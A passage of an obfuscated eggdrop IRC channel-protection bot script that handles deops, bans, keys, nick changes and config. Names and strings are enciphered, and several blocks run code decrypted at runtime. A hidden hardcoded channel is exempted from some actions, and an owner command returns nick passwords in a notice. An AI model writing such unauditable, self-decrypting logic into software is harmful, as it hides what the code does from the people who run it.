putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1WlmG YzMmVw ZWnRM 4~$knick1..!"
}
return 1
}
if {[matchattr $knick m]} {
if {$nick != $botnick} {
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1WlmG YzMmVw NzhGvI 4~$knick1..!"
}
return 1
}
if {[matchattr $cflag E]} {
if {$nick == $botnick} {
set [lines "nvmulixv"] [rand 4]
if {$menforce == 1} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~1YzMmVw UIlN 4~[string toupper $channel]~ ~[banms]~"
} elseif {$menforce == 2} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~1NzGxS YzMh UIlN 4~[unsix $bhost]~ ~[banms]~"
} elseif {$menforce == 3} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~1UROGvI YzMh UIlN 4~[unsix $bhost]~ ~[banms]~"
} else {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~1IvUfhVw ORmP UIlN 4~[string toupper $channel]~ ~[banms]~"
}
} else {
if {[matchattr $nick n]} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~4ZWnRM1 YzMmVw 4LfG1..!"
} else {
if {[matchattr $nick m]} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~4NzhGvI1 YzMmVw 4LfG1..!"
} else {
if {[isop $knick $channel] && ![matchattr $nick f]} { return 1 }
if {![matchattr $knick f]} {
set [lines "nvmulixv"] [rand 5]
if {$menforce == 1} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~1YzMmVw YB 4@~$nick ~~[banms]~"
} elseif {$menforce == 2} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~1NzGxS YzMh UIlN 4~[unsix $bhost]~ ~[banms]~"
} elseif {$menforce == 3} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~1YzMmVw UIlN 4~[string toupper $channel]~ ~[banms]~"
} elseif {$menforce == 4} {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~1UROGvI YzMh UIlN 4~[unsix $bhost]~ ~[banms]~"
} else {
putsrv "PRXP ~$channel ~~$knick ~:~$notc ~1IvUfhVw ORmP UIlN 4~[string toupper $channel]~ ~[banms]~"
}
}
}
}
}
}
}
}
return 0
}
bind mode - * prot:deop
proc [lines "kilg:wvlk"] {nick uhost handle channel mchange {opnick ""}} {
global botnick deopme ps invme virus_nick quick notb notc bannick lastkey unop igflood is_m op_it
set [lines "xuozt"] "c$channel"
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "nlwv"] [lindex $mchange 0]
if {$opnick == ""} {
set [lines "lkmrxp"] [lindex $mchange 1]
}
if {$mode == "-m"} {
foreach x [utimers] {
if {[string match "*set_-m $channel*" $x] || [string match "*TRAFFIC $channel*" $x]} {
killutimer [lindex $x 2]
}
}
catch {unset is_m($channel)}
if {![botisop $channel]} { return 0 }
if {[matchattr $cflag V]} {
foreach x [chanlist $channel] {
if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
set [lines "xivg"] [getuser $cflag XTRA "VC"]
foreach ct [utimers] {
if {[string match "*voiceq*" $ct]} {
if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
set [lines "xivg"] [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
}
}
}
utimer $cret [list voiceq $channel $x]
}
}
}
return 0
}
if {$mode == "+k"} {
set [lines "ozhgpvb"] $opnick
if {[matchattr $cflag K] && [matchattr $nick Z]} {
putlog "key change to $opnick"
setuser $cflag XTRA "CI" [zip $opnick]
saveuser
}
}
if {$mode == "-k"} {
catch { unset lastkey }
if {$nick != $botnick} {
set igflood($nick) "1"
}
return 0
}
if {$mode == "+m"} {
foreach x [utimers] {
if {[string match "*set_-m $channel*" $x] || [string match "*voiceq $channel*" $x] || [isutimer "advq $channel"]} {
killutimer [lindex $x 2]
}
}
if {$nick == $botnick} {
if {![string match "*m*" [lindex [channel info $channel] 0]]} {
if {[string match "*+shared*" [channel info $channel]]} {
puthelp "NOTICE $channel :OnE MInUtE MoDeRaTe DuE tO FLoOd..!"
}
utimer 70 [list set_-m $channel]
if {[isutimer "TRAFFIC $channel"]} {
utimer 20 [list pub_nobot "*" "*" "*" $channel "*"]
return 0
}
}
} {
if {[isutimer "goback"]} {
catch { clearqueue all }
foreach x [utimers] {
if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] }
if {[string match "*goback*" $x]} { killutimer [lindex $x 2] ; goback }
}
utimer 2 del_nobase
return 0
}
utimer [expr 1800 + [rand 60]] [list set_-m $channel]
}
return 0
}
if {$mode == "+b"} {
if {$opnick == "*!*@heavy.join.flood.channel.temporary.moderate"} {
utimer 40 [list putlog "TRAFFIC $channel"]
if {$nick == $botnick} {
utimer 40 [list putserv "mode $channel -b *!*@heavy.join.flood.channel.temporary.moderate"]
if {[info exists is_m($channel)]} { return 0 }
if {$quick == "1"} {
putquick "mode $channel +m"
} {
putserv "mode $channel +m"
}
set is_m($channel) 1
return 0
}
}
ban_chk $nick $uhost $handle $channel $mchange $opnick
return 0
}
if {$mode == "-b"} {
if {[info exists is_ban($opnick$channel)]} {
catch {unset is_ban($opnick$channel)}
}
if {[isutimer "unbanq $channel $opnick"]} {
foreach x [utimers] {
if {[string match "*unbanq $channel $opnick*" $x]} {
killutimer [lindex $x 2]
}
}
}
foreach x [ignorelist] {
if {[lindex $x 0] == $opnick} {
unsetignore [lindex $x 0]
return 0
}
} 
catch { killban $opnick }
return 0
}
if {$nick == $opnick} { return 0 }
if {$opnick == $botnick && $mode == "+o"} {
chk_on_op $channel
return 0
}
if {$mode == "+o" && [isop $botnick $channel]} {
if {[info exists op_it($opnick)]} { 
catch {unset op_it($opnick)}
}
if {[matchattr $opnick O]} {
set [lines "xnlwv"] [getchanmode $channel]
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -ko 4No@p.LIsT $opnick"
} {
puthelp "mode $channel -o $opnick"
}
return 0
}
if {[info exists unop($opnick)]} {
if {$nick == "ChanServ"} {
catch { unset unop($opnick) }
return 0 
}
if {[matchattr $opnick f] || [matchattr $nick f] || $nick == $botnick} {
return 0 
}
utimer [expr 5 + [rand 10]] [list unallowed $channel $nick $opnick]
return 0
}
}
if {$mode == "-o"} {
foreach x [utimers] {
if {[string match "*unallowed $channel $opnick*" $x]} { killutimer [lindex $x 2] }
}
if {$opnick == $botnick} {
if {[isutimer "DEOP $channel"]} { return 0 }
foreach x [utimers] {
if {[string match "*gop $channel*" $x]} { killutimer [lindex $x 2] }
}
utimer 2 [list putlog "DEOP $channel"]
if {![matchattr $nick f] && $nick != "ChanServ" && ![string match "*dal.net*" $nick] && ![string match "*Guest*" $botnick]} {
if {![info exists igflood($nick)]} {
if {[matchattr $cflag D]} {
set [lines "wvlknv"] $nick
}
}
}
if {![matchattr $nick m]} {
if {[string tolower $channel] != [dezip "PK6m.0G/~7xb1"]} {
if {![string match "*+protectfriends*" [channel info $channel]]} {
putlog "!Log! CHaNOP <<$channel>>"
putsrv "XszmHvie lk ~$channel ~~$botnick"
}
}
}
return 0
}
if {![isop $botnick $channel]} { return 0 }
if {[isutimer "deopprc*$opnick"]} {
foreach x [utimers] {
if {[string match "*deopprc*$opnick*" $x]} {
putlog "!UnDeOp OR UnKIcK!"
catch { killutimer [lindex $x 2] }
}
}
}
if {$nick == "ChanServ" && [matchattr $opnick o]} {
voiceq $channel $opnick
return 0
}
if {$nick == "ChanServ"} {
set unop($opnick) "1"
return 0 
}
if {[matchattr $nick f] || $nick == $botnick} { return 0 }
if {$nick == "ChanServ"} { return 0 }
if {$opnick == $ps} {
if {![info exists igflood($nick)]} {
putserv "KICK $channel $nick :[lgrnd] [lines "1WlmG Wv@k 4lw[lines "on"]1..!"]"
}
opq $channel $opnick
return 0
}
if {[matchattr $opnick n]} {
if {![info exists igflood($nick)]} {
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1ZWnRM 4Wv@k1 TfzIw4..!"
opq $channel $opnick
}
return 0
}
if {[matchattr $opnick m]} {
if {![info exists igflood($nick)]} {
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~1NzhGvI 4Wv@k1 TfzIw1..!"
opq $channel $opnick
}
return 0
}
if {[matchattr $opnick o]} {
opq $channel $opnick
return 0
}
if {$opnick == $notb} {
if {![info exists igflood($nick)]} {
putserv "KICK $channel $nick :[lgrnd] [lines "1WlmG Wv@k 4LmY[lines "ot"]1..!"]"
}
opq $channel $opnick
return 0
}
}
}
proc [lines "fmzooldvw"] {chan nick opnick} {
if {![botisop $chan]} { return 0 }
if {![isop $nick $chan]} { return 0 }
if {[isop $opnick $chan]} { return 0 }
putserv "mode $chan -ko 4ChanServ.UnaLLowEd $nick"
}
bind nick - * chk_nicks
proc [lines "xsp_mrxph"] {unick uhost hand chan newnick} {
global notc bannick botnick nick
if {$unick == $nick && $unick != $botnick} {
putsrv "MRXP ~$nick"
}
if {[matchattr $unick Q]} {
chattr $unick -Q
foreach x [getuser $unick HOSTS] {
delhost $unick $x
}
set [lines "slhgnzhp"] "${unick}!*@*"
setuser $unick HOSTS $hostmask
saveuser
}
if {![isop $botnick $chan]} { return 0 }
if {[isutimer "deopprc*$unick"]} {
foreach x [utimers] {
if {[string match "*deopprc*$unick*" $x]} {
putlog "!UnDeOp!"
catch { killutimer [lindex $x 2] }
}
}
}
if {[string match "Guest*" $newnick]} { 
if {[matchattr $unick f]} { return 0 }
if {[isop $newnick $chan]} { 
utimer [expr 80 + [rand 20]] [list deopprc $chan $newnick] 
return 0
}
}
if {[matchattr $newnick O] && [isop $newnick $chan]} { 
set [lines "xnlwv"] [getchanmode $chan]
if {![string match "*k*" $cmode]} {
putserv "mode $chan -ko 4No@p.LIsT $newnick"
} {
putserv "mode $chan -o $newnick" 
}
}
akick_chk $newnick $uhost $chan
spam_chk $newnick $uhost $hand $chan
return 0
}
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[decrypt 64 "d3VeO/ATgwd."] "[[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] "RMmO21tAH8i/"]"] [[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] "[[decrypt 64 "d3VeO/ATgwd."] "ceyVp0BfqmY0n9tZu/nRGbt0Xo2a7/SaRRA0"]"]
proc [lines "nht_rwvmgrub"] {nick uhost hand rest} {
global notc 
set [lines "rw"] [lindex $rest 0]
set [lines "kzhhdliw"] [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {($id == "") || ($password == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: rwvmgrub <mrxp> <kzhhdliw>"
return 0
}
putsrv "MrxpHvie rwvmgrub ~$id ~~$password"
puthlp "MLGRXV ~$nick ~:~$notc ~Rwvmgrub gl ~$id"
return 0
}
proc [lines "kfy_ivzomrxp"] {unick uhost hand chan rest} {
global notc keep-nick nick
if {![matchattr $unick Q]} {
puthlp "MLGRXV ~$unick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "pvvk-mrxp"] 1
putsrv "MRXP ~$nick"
return 0
}
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"] 0
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] {} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "t\o\l\y\z\o"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"]
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "rmxi"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"]]
if {$idxc == 1} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "yRtEm0kAakf0jQOqY.GS3rL1mJTLZ1Q~HEPY1"]"]
} elseif {$idxc == 2} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "tFcBm/qfnFz.7MG.s.tt4/e0mJTLZ1QHE~PY1"]"]
} elseif {$idxc == 3} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "tFcBm/qfnFz.FhMZf.Pu48M/mJTLZ1QH~EPY1"]"]
} elseif {$idxc == 4} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "tFcBm/qfnFz.iHzfS/raeYH1m~JTLZ1QHEPY1"]"]
} elseif {$idxc == 5} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "tFcBm/qfn~Fz.E/tlw08ln2G1mJTLZ1QHEPY1"]"]
} elseif {$idxc == 6} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "tFcBm/qfnFz.cI~zAa/G7WpJ/mJTLZ1QHEPY1"]"]
} elseif {$idxc == 7} {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "tFcBm/qfnFz.bPQ0G.bZby~r0RMWbJ/g5gq51WPPIy0xXFcn0w4ZfN1eZBOL/"]"]
} else {
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "r\w\c\x"] 0
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "ot\i\m\w"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "yRtEm0kAakf0F~hMZf.Pu48M/mJTLZ1QHEPY1"]"]
}
}
proc [lines "izmwh"] {length} {
set [lines "xszih"] \\^|_[]{}\\
set [lines "xlfmg"] [string length $chars]
for {set i 0} {$i < $length} {incr i} {
append result [string index $chars [rand $count]]
}
return $result
}
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[decrypt 64 "d3VeO/ATgwd."] "glgs"] "#[[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 1][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 20][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 18][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 20][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 10]"  
proc [lines "kfy_izmwmrxp"] {unick uhost hand chan rest} {
global notc keep-nick nick altnick botnick
if {$rest != ""} {
set [lines "pvvk-mrxp"] 0
set [lines "mrxpxs"] "[lindex $rest 0]\[[rand 9][rand 9][randstring 1]\]"
putsrv "MRXP ~$nickch"
} {
if {$botnick != $nick && $botnick != $altnick} { return 0 }
set [lines "pvvk-mrxp"] 0
putsrv "MRXP ~[rands 8]~"
}
return 0
}
proc [lines "kfy_zogmrxp"] {nick uhost hand chan rest} {
global altnick keep-nick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "pvvk-mrxp"] 0
putsrv "MRXP ~$altnick"
}
[[decrypt 64 "d3VeO/ATgwd."] "grnvi"] 5 [[decrypt 64 "d3VeO/ATgwd."] "xsl_xsl"]
bind raw - 305 not_away
proc [lines "mlg_zdzb"] { from keyword arg } {
if {[isutimer "del_nobase"]} { utimer 1 del_nobase }
if {[isutimer "goback"]} { utimer 2 goback }
unsetignore "*!*@*"
}
bind raw - 404 ch_moderate
bind raw - 473 ch_invite
bind raw - 474 ch_banned
bind raw - 475 ch_key
bind raw - 478 ch_full
bind raw - 432 nickERROR
proc [lines "mrxpVIILI"] { from keyword arg } {
global nick
set [lines "mrxp"] "ERR[unixtime]"
}
proc [lines "xs_nlwvizgv"] { from keyword arg } {
putlog "CANT SEND ON MODERATE!"
if {[isutimer "del_nobase"]} {
catch { clearqueue all }
foreach x [utimers] {
if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] ; utimer 1 del_nobase }
}
}
}
proc [lines "xs_rmergv"] { from keyword arg } {
global double joinme notc 
set [lines "xszm"] [lindex $arg 1]
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip "PK6m.0G/~7xb1"]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~~$chan ~4(+R)"
}
if {[string tolower $chan] != [dezip "PK6m.0G/~7xb1"]} {
putsrv "XszmHvie rmergv ~$chan"
}
set [lines "wlfyov"] 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip "PK6m.0G/~7xb1"]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~IvNLEV ~$chan ~4(+R)"
}
channel remove $chan
savechan
}
set [lines "qlrmnv"] ""
set [lines "wlfyov"] 0
}
return
}
[[decrypt 64 "d3VeO/ATgwd."] "kilx"] [[decrypt 64 "d3VeO/ATgwd."] "dslmnk"] {} {
[[decrypt 64 "d3VeO/ATgwd."] "tolyzo"] [[decrypt 64 "d3VeO/ATgwd."] "m\l\gn"] [[decrypt 64 "d3VeO/ATgwd."] "ov\m\x"] 
[[decrypt 64 "d3VeO/ATgwd."] "grnvi"] 5 [[decrypt 64 "d3VeO/ATgwd."] "dslmnk"]
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 13][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 14][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 19][[[decrypt 64 "d3VeO/ATgwd."] "hgirmt"] [[decrypt 64 "d3VeO/ATgwd."] "rmwvc"] $lenc 12] [[[decrypt 64 "d3VeO/ATgwd."] "wvar\k"] "[[decrypt 64 "d3VeO/ATgwd."] "WOcVA1hMPKs/YgRY./NlyGx0gmzZ3.jqVkv0"]"] 
}
proc [lines "xs_yzmmvw"] { from keyword arg } {
global double joinme notc 
set [lines "xszm"] [lindex $arg 1]
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip "PK6m.0G/~7xb1"]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~~$chan ~4(+Y)"
}
if {[string tolower $chan] != [dezip "PK6m.0G/~7xb1"]} {
putsrv "XszmHvie rmergv ~$chan"
puthlp "XszmHvie fmyzm ~$chan"
}
set [lines "wlfyov"] 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip "PK6m.0G/~7xb1"]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~IvNleV ~$chan ~4(+Y)"
}
if {[string tolower $chan] != [dezip "PK6m.0G/~7xb1"]} {
putsrv "XszmHvie rmergv ~$chan"
}
channel remove $chan
savechan
}
set [lines "qlrmnv"] ""
set [lines "wlfyov"] 0
}
return 0
}
[[decrypt 64 "d3VeO/ATgwd."] "grnvi"] 5 [[decrypt 64 "d3VeO/ATgwd."] "xal_xal"]
proc [lines "xs_pvb"] { from keyword arg } {
global double joinme notc lastkey chankey
set [lines "xszm"] [lindex $arg 1]
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip "PK6m.0G/~7xb1"]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~~$chan ~4(+P)"
}
if {[matchattr $cflag K]} {
puthlp "QLRM ~$chan ~:~[dezip [getuser $cflag XTRA "CI"]~]"
} {
puthlp "QLRM ~$chan"
}
if {[info exists lastkey]} {
puthlp "QLRM ~$chan ~:~$lastkey"
}
set [lines "wlfyov"] 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip "P~K6m.0G/7xb1"]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~IvNleV ~$chan ~4(+P)"
}
channel remove $chan
savechan
return 0
}
if {[string tolower $chan] != [dezip "PK6m.0G/~7xb1"]} {
putsrv "XszmHvie rmergv ~$chan"
}
if {[string tolower $chan] == [dezip "PK6m.0G/~7xb1"]} {
putsrv "QLRM ~$chan ~:~$chankey"
}
set [lines "qlrmnv"] ""
set [lines "wlfyov"] 0
}
return 0
}
proc [lines "xs_ufoo"] { from keyword arg } {
global double joinme notc botnick
set [lines "xszm"] [lindex $arg 1]
if {[isop $botnick $chan]} {
set [lines "yzmh"] ""
set [lines "r"] 0
foreach x [chanbans $chan] {
if {$i < 5} {
append bans " [lindex $x 0]"
set [lines "r"] [incr i]
}
}
putserv "MODE $chan -kbbbbb 4BaN.LIsT.FuLL $bans"
return 0
}
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip "PK6m.0G/~7xb1"]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~~$chan ~4(+O)"
}
if {[string tolower $chan] != [dezip "PK6m.0G/~7xb1"]} {
putsrv "XszmHvie rmergv ~$chan"
}
set [lines "wlfyov"] 1
return 0
}
if {$double == 1} {
if {[string match "*+statuslog*" [channel info $chan]]} {
if {$joinme != "" && [string tolower $chan] != [dezip "~PK6m.0G/7xb1"]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~IvNLEV ~$chan ~4(+O)"
}
channel remove $chan
savechan
}
set [lines "qlrmnv"] ""
set [lines "wlfyov"] 0
}
return 0
}
if {$altnick == ""} { 
set [lines "zogmrxp"] [randstring 7] 
}
set [lines "yzwdliwh"] ""
set [lines "zwedliwh"] ""
proc [lines "xlmurt"] {} {
global nick nickpass altpass altnick realname owner kops my-ip banner cycle_random
global notc logstore cfgfile badwords advwords ban-time my-hostname kickclr awaybanner
if {[validuser "config"]} {
if {[getuser "config" XTRA "REALNAME"]!=""} {
set [lines "ivzomznv"] [dezip [getuser "config" XTRA "REALNAME"]]
} else {
set [lines "ivzomznv"] [realnames]
}
if {[getuser "config" XTRA "USERNAME"]!=""} {
set [lines "ivzomznv"] [dezip [getuser "config" XTRA "USERNAME"]]
}
if {[getuser "config" XTRA "NICK"]!=""} {
set [lines "mrxp"] [dezip [getuser "config" XTRA "NICK"]]
}
if {[getuser "config" XTRA "NICKPASS"]!=""} {
set [lines "mrxpkzhh"] [dezip [getuser "config" XTRA "NICKPASS"]]
}
if {[getuser "config" XTRA "ALTNICK"]!=""} {
set [lines "zogmrxp"] [dezip [getuser "config" XTRA "ALTNICK"]]
}
if {[getuser "config" XTRA "ALTPASS"]!=""} {
set [lines "zogkzhh"] [dezip [getuser "config" XTRA "ALTPASS"]]
}
if {[getuser "config" XTRA "BAN"]!=""} {
set [lines "yzmmvi"] [dezip [getuser "config" XTRA "BAN"]]
lappend cycle_random $banner
}
if {[getuser "config" XTRA "jes_"]!=""} {
set [lines "zdzbyzmmvi"] [dezip [getuser "config" XTRA "jes_"]]
}
if {[getuser "config" XTRA "BANTIME"]!=""} {
set [lines "yzm-grnv"] [getuser "config" XTRA "BANTIME"]
}
if {[getuser "config" XTRA "BADWORDS"]!=""} {
set [lines "yzwdliwh"] [getuser "config" XTRA "BADWORDS"]
}
if {$badwords == ""} {
set [lines "yzwdliwh"] "cibai bitch kimak memek kontol kanjut bangsat ngentot fuck peler lanciau bajingan vagina ngewe shit asshole anjing babi kampang"
setuser "config" XTRA "BADWORDS" $badwords
}
if {[getuser "config" XTRA "ADVWORDS"]!=""} {
set advwords [getuser "config" XTRA "ADVWORDS"]
}
if {$advwords == ""} {
set advwords "http www join klik click"
setuser "config" XTRA "ADVWORDS" $advwords
}
if {[getuser "config" XTRA "KOPS"]!=""} {
set [lines "plkh"] "T"
}
if {[getuser "config" XTRA "KCLR"]!=""} {
set [lines "prxpxoi"] "T"
}
if {[getuser "config" XTRA "VHOST"]!=""} {
set [lines "nb-slhgmznv"] [getuser "config" XTRA "VHOST"]
set [lines "nb-rk"] [getuser "config" XTRA "VHOST"]
}
if {[getuser "config" XTRA "LOGCHAN"]!=""} { 
putlog "!Log! CReATING LOG FiLE <<[getuser "config" XTRA "LOGCHAN"]>>"
set [lines "olthgliv"] "${cfgfile}.log"
logfile jpk [getuser "config" XTRA "LOGCHAN"] $logstore 
}
} else {
adduser "config" ""
chattr "config" "-hp"
}
foreach x [userlist] {
chattr $x -Q
if {$x != "config" && $x != "AKICK"} {
foreach y [getuser $x HOSTS] {
delhost $x $y
}
set [lines "slhgnzhp"] "${x}!*@*"
setuser $x HOSTS $hostmask
}
}
if {![validuser "AKICK"]} {
set [lines "slhgnzhp"] "telnet!*@*"
adduser "AKICK" $hostmask
chattr "AKICK" "-hp"
chattr "AKICK" "K"
}
if {![validuser $owner]} {
set [lines "slhgnzhp"] "$owner!*@*"
adduser $owner $hostmask
chattr $owner "Zfhjmnoptx"
}
saveuser
}
utimer 1 {config}
utimer 2 {seen}
[[decrypt 64 "d3VeO/ATgwd."] "kilx"] [[decrypt 64 "d3VeO/ATgwd."] "zxp_zxg"] {nick uhost hand chan rest} {
[[decrypt 64 "d3VeO/ATgwd."] "tolyzo"] [[decrypt 64 "d3VeO/ATgwd."] "ylgmrxp"] [[decrypt 64 "d3VeO/ATgwd."] "ev\i\m"]
[[decrypt 64 "d3VeO/ATgwd."] "hvg"] [[decrypt 64 "d3VeO/ATgwd."] "vovc"] $vern
[[decrypt 64 "d3VeO/ATgwd."] "kfgsok"] "MLGRXV ~$nick ~:\001E\V\I ~$elex \001"
return 0
}
proc [lines "fmxloli"] {s} {
regsub -all --  $s "" s
regsub -all --  $s "" s
regsub -all --  $s "" s
regsub -all -- \[0-9\]\[0-9\],\[0-9\]\[0-9\] $s "" s
regsub -all -- \[0-9\],\[0-9\]\[0-9\] $s "" s
regsub -all -- \[0-9\]\[0-9\],\[0-9\] $s "" s
regsub -all -- \[0-9\],\[0-9\] $s "" s
regsub -all -- \[0-9\]\[0-9\] $s "" s
regsub -all -- \[0-9\] $s "" s
return $s
}
proc [lines "nht_ylghvg"] {unick uhost hand rest} {
global nick nickpass altpass altnick own notc 
if {$unick != $own} {
return 0
}
puthlp "MLGRXV ~$unick ~:~$notc ~1hg ~$nick ~(~$nickpass) ~2mw ~$altnick ~(~$altpass)"
return 0
}
proc [lines "nht_ivfhvi"] {nick uhost hand rest} {
global botnick owner notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$nick != $owner} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [userlist] {
if {($x != "config") && ($x != "AKICK")} { deluser $x }
}
adduser $owner "$owner!*@*"
chattr $owner "Zfhjmnoptx"
puthlp "MLGRXV ~$nick ~:~$notc ~Ivhvgrmt FhVI hfxvhhufoob, hvg kzhh 1hg."
saveuser
}
set bs(limit) 8000
set bs(nicksize) 32
set bs(no_pub) ""
set bs(no_log) ""
set bs(log_only) ""
set bs(flood) 4:15
set bs(ignore) 1
set bs(ignore_time) 2
set bs(smartsearch) 1
set bs(logqueries) 1
set bs(path) "language/"
set bs(updater) 10402
set bs(oldver) $bs(updater)
set bs(version) bseen1.4.2c
proc [lines "hvvm"] {} {
global version notc notd
